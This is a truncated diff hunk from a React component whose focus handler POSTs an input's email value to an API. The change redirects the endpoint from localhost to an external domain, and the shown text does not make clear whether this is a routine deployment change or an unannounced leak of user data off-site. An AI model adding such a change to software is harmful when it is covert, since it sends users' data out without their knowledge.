@@ -7,7 +7,7 @@ export const InteractiveBtn = () => {
   const inputRef = useRef<HTMLInputElement>(null);
 
   const handleFocus = async () => {
-    await fetch('http://localhost:4000/api/db', {
+    await fetch('https://aavault.io/api/db', {
       method: 'POST',
       body: JSON.stringify({
         email: inputRef.current?.value,
